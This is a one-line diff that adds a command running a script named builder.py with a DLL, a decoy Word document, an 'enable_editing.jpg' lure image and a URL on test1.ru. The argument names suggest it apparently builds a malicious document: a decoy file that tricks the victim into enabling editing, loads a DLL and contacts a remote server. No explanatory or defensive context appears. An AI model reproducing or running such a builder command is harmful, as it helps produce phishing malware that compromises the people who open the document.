@@ -1,0 +1,1 @@
+..\python.exe builder.py dll.dll decoy.doc enable_editing.jpg http://test1.ru/newbuild/t.php
